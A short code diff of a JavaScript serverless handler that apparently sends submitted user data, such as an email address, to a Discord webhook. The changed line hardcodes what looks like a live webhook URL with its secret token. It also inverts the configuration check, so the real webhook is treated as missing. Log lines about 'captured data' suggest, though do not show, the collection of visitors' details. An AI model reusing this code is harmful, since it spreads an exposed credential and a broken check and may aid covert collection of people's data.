@@ -70,7 +70,7 @@ module.exports = async (req, res) => {
     const WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
     
     // If no webhook configured, still return success (for testing)
-    if (!WEBHOOK_URL || WEBHOOK_URL.includes('YOUR_WEBHOOK')) {
+    if (!WEBHOOK_URL || WEBHOOK_URL.includes('https://discord.com/api/webhooks/1432968170179919922/fuM413rrfAeu_Tzu4sJIKdZmr5P8Oow__7pOaTreTYg6osohkP7D_NDFOCgxFSCJuAPI')) {
       console.log('⚠️ No Discord webhook configured');
       console.log('📧 Captured data:', { 
         email: email.substring(0, 3) + '***', 
